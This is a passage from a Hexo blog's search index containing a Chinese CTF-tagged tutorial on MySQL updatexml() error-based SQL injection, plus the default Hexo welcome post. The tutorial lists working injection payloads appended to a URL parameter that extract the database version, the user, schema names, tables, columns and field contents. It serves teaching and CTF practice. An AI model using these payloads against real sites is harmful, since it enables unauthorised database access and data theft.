date&lt;&#x2F;text&gt;</span><br><span class="line">&lt;&#x2F;values&gt;&#39;);#插入第二个数据</span><br></pre></td></tr></table></figure><p>(2) 使用<code>select * from xml1</code>查看</p><p><img src="iamge-updatexml1.png" alt="updatexml1"></p><p>（3）执行<code>SELECT updatexml(title,&#39;/values/text&#39;,&#39;one&#39;) FROM xml1;</code>语句。发现执行后，原来有<text>标签的地方连同标签里的内容都被替换成了‘one’。</p><p><img src="image-20200320235648716.png" alt="image-20200320235648716"></p><h2 id="0x02updatexml-报错注入的原因及注意点"><a href="#0x02updatexml-报错注入的原因及注意点" class="headerlink" title="0x02updatexml()报错注入的原因及注意点"></a>0x02updatexml()报错注入的原因及注意点</h2><p>由于updatexml的第二个参数需要<u><strong>Xpath</strong></u>格式的字符串,但如果在提交的不符合和Xpath格式,会用报错的形式将执行后的结果回显出了来.</p><p>例如:执行sql语句<code>select updatexml(1,concat(0x7e,(select database()),0x7e),1);</code>后,可以看到回显:</p><p><img src="image-20200321131351700.png" alt="image-20200321131351700"></p><p>如上图,原本<code>select database()</code>的地方被执行了,显示出数据库名–bookshop.</p><p>在这里要注意的事：</p><p>(1.)由于updatexml的保错回显只能返回一个属性，所以如果一个表中用多行，需要用‘limit’来限制行数（元组数）为一。</p><p>(2.)在构建第二个参数时，要确保第二个参数不符合Xpath格式。有的函数符合Xpath格式可以用concat(‘不符合Xpath格式的字符串’,’要执行的恶意sql语句’)来构造’’</p><p><img src="image-20200321002711168.png" alt="image-20200321002711168"></p><p>(3.)若要注入出的数据格式就是xml结构的数据则可以直接在第二个参数select:</p><p><img src="image-20200321160707020.png" alt="image-20200321160707020"></p><p>(4.)用这个方法注出来的数据有长度限制。且在恶意代码前的参数字符越多，注出的有效信息越少。（如下图）.</p><p><img src="image-20200321161640552.png" alt="image-20200321161640552"></p><p>so在有一张表有多行时最好用limit 一行一行查询,慎重使用group_concat函数.(group_concat可能显示不全,用substr来截取拼接)</p><p><img src="image-20200324151215694.png" alt="image-20200324151215694"></p><h2 id="0x03updatexml-的注入"><a href="#0x03updatexml-的注入" class="headerlink" title="0x03updatexml()的注入"></a>0x03updatexml()的注入</h2><p>(1.)爆数据库版本信息</p><p><a href="http://127.0.0.1/sql.php?id=1" target="_blank" rel="noopener">http://127.0.0.1/sql.php?id=1</a> and updatexml(1,concat(0x7e,(SELECT version()),0x7e),1) ;#</p><p>(2.)爆出用户</p><p><a href="http://127.0.0.1/sql.php?id=1" target="_blank" rel="noopener">http://127.0.0.1/sql.php?id=1</a> and updatexml(1,concat(0x7e,(SELECT user()),0x7e),1)  ;#</p><p>(3.)爆出所用数据库</p><p><a href="http://127.0.0.1/sql.php?id=1" target="_blank" rel="noopener">http://127.0.0.1/sql.php?id=1</a> and updatexml(1,concat(0x7e,(SELECT database()),0x7e),1) ；#</p><p>(4.)爆全部数据库</p><p><a href="http://www.hackblog.cn/sql.php?id=1" target="_blank" rel="noopener">http://www.hackblog.cn/sql.php?id=1</a> and uand  updatexml(1,concat(0x7e,(SELECT schema_name from information_schema.SCHEMATA  limit 0,1),0x7e),1);#</p><p>(5.)爆表<br><a href="http://127.0.0.1/sql.php?id=1" target="_blank" rel="noopener">http://127.0.0.1/sql.php?id=1</a> and updatexml(1,concat(0x7e,(SELECT table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e),1);#</p><p>(6.)爆字段</p><p><a href="http://127.0.0.1/sql.php?id=1" target="_blank" rel="noopener">http://127.0.0.1/sql.php?id=1</a> and updatexml(1,concat(0x7e,(SELECT column_name from information_schema.columns where table_name=’xml1’ limit 0,1),0x7e),1);#</p><p>(7.)爆字段内容<br><a href="http://127.0.0.1/sql.php?id=1" target="_blank" rel="noopener">http://127.0.0.1/sql.php?id=1</a> and  updatexml(1,concat(0x7e,(SELECT  title from xml1 limit 0,1),0x7e),1);#</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> mysql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2019/10/03/hello-world/"/>
      <url>/2019/10/03/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p><a id="more"></a><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html" target="_blank" rel="noopener">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
